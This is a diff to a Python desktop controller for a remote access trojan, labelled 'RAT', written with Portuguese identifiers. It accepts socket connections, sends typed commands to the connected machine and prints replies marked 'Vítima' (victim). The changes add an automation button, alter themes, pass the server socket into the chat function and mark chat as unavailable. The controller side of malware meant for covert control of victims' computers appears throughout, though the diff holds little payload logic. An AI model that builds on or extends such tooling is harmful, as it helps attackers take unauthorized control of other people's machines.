@@ -6,6 +6,7 @@ from subprocess import Popen
 import socket
 import keyboard
 import time
+import automatizacao
 
 ipPadrao = socket.gethostbyname(socket.gethostname())
 portaPadrao = 8081
@@ -16,8 +17,8 @@ version = '1.0'
 ####### PÁG INICIAL #######
 
 def inicial(client=None, client_addr=None):
-    sg.theme('SystemDefault')
-    sg.theme_button_color(('black', '#C2FFC2'))
+    sg.theme('Dark')
+    sg.theme_button_color(('white', 'grey'))
 
     
 
@@ -28,7 +29,7 @@ def inicial(client=None, client_addr=None):
         [sg.Text('')],
         [sg.Text('Features')],
         [sg.Text('')],
-        [sg.Button('RAT', key='btnRat', size=(10, 1))],
+        [sg.Button('RAT', key='btnRat', size=(10, 1)), sg.Button('Automatização', key='btnAuto', size=(15,1))],
 
     ]
 
@@ -47,6 +48,8 @@ def inicial(client=None, client_addr=None):
 
         if eventos == 'btnRat':
             conectado()
+        if eventos == 'btnAuto':
+            automatizacao.autoInit()
         
 
 
@@ -93,10 +96,10 @@ def conectar(host, porta, janelaOld):
     client, client_addr = server.accept()
     sg.popup("Uma nova conexão foi estabelecida!")
     janelaOld.close()
-    conectado(client, client_addr)
+    conectado(client, client_addr, server)
     
                     
-def conectado(client=None, client_addr=None):
+def conectado(client=None, client_addr=None, server=None):
     sg.theme('DarkBlack')
     sg.theme_button_color(('white', '#9700FF'))
 
@@ -129,7 +132,7 @@ def conectado(client=None, client_addr=None):
             cmd(client, client_addr, janela)
         
         if eventos == 'Chat':
-            chat(client, client_addr, janela)
+            chat(client, client_addr, janela, server)
         
         if eventos == 'Novo':
             rat(client, client_addr, janela)
@@ -219,14 +222,14 @@ def cmd(client, client_addr, janela):
                 conectado(client, client_addr)
 
 
-def chat(client, client_addr, janela):
+def chat(client, client_addr, janela, server):
     sg.theme('DarkBlack')
     sg.theme_button_color(('white', '#9700FF'))
     
     layout = [
         [sg.Text('Chat')],
         [sg.Text('')],
-        [sg.Button('Iniciar', key='btnEnvCmd')]
+        [sg.Text('Indisponível no momento')],
     ]
 
     janelaCmd = sg.Window(''+ madeBy +' ' + version + ' - Chat', layout, size=(230,150), finalize=True)
@@ -246,8 +249,9 @@ def chat(client, client_addr, janela):
             while command != "quit":
                 command = command.encode()
                 client.send(command)
-                response = client.recv(1024)
+                response = client.recv(1024).decode()
                 print("Vítima: "+response)
+                
 
             
     
